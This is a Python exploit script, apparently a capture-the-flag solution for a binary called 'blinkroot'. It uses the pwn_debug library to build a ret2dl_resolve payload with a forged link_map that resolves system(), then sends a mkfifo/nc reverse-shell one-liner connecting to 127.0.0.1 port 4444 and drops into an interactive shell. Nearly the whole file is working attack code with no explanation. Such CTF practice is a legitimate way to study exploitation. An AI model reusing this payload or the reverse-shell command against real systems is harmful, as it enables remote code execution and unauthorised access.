# File: exp.py
# Author: raycp
# Date: 2019-05-31
# Description: exp for blinkroot

from pwn_debug  import *

pdbg=pwn_debug("./blinkroot")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
elf=pdbg.elf
libc=pdbg.libc

def pwn():

    addr=0x600BC0
    plt0=0x600B40
    payload=p64(0x10000000000000000-(addr-plt0))
    payload+=p64(addr+0x100)
    payload+="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f"

    payload=payload.ljust(0x100,'\x00')
    
    offset=libc.symbols['system']-libc.symbols['__libc_start_main']
    got_libc_address=elf.got['__libc_start_main']

    ret2dl_resolve=pdbg.ret2dl_resolve()
    # fake_link_map address is addr+0x100 
    fake_link_map=ret2dl_resolve.build_link_map(addr+0x100,1,offset,got_libc_address)
    payload+=fake_link_map
    payload=payload.ljust(0x400,'\x00')
    #pdbg.bp(0x400575)
    p.send(payload) 
    p.interactive() # reverse shell

if __name__ == '__main__':
   pwn()


